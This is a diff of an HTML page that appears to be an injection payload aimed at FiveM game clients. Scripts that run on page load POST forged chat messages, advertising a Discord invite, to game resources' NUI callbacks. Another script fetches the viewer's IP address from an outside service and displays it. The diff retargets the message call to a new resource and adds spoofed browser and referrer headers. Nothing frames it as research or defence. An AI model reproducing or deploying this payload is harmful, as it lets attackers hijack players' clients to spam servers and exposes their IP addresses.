@@ -65,8 +65,7 @@
     </style>
 </head>
 <body>
-    <div id="gallery-header">الثلاثي المرح</div>
-    <div id="gallery-header">discord.gg/343</div>
+    <div id="gallery-header">discord.gg/343 الثلاثي المرح</div>
 
     <div id="gallery-header">IP Address: <span id="ip-address-value"></span></div>
 
@@ -96,19 +95,22 @@
 </body>
 </html>
 <script>
-    fetch("http://melix_chat/chatResult", {
-      "headers": {
-        "accept": "*/*",
-        "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
-      },
-      "referrer": "",
-      "referrerPolicy": "strict-origin-when-cross-origin",
-      "body": "{\"message\":\"شيوخ فايف ام اختصار الدس pwn\"}",
-      "method": "POST",
-      "mode": "cors",
-      "credentials": "omit"
-    });
-    </script>
+  fetch("https://flix-scripts/chatResult", {
+    method: "POST",
+    mode: "cors",
+    credentials: "omit",
+    headers: {
+      "accept": "/",
+      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+      "sec-ch-ua": "\"Chromium\";v=\"103\"",
+      "sec-ch-ua-mobile": "?0",
+      "sec-ch-ua-platform": "\"Windows\""
+    },
+    referrer: "https://cfx-nui-flix-scripts/",
+    referrerPolicy: "strict-origin-when-cross-origin",
+    body: JSON.stringify({ message: "اختصار الدس 343" })
+  });
+</script>
         <script>
 
             fetch("https://api64.ipify.org?format=json")
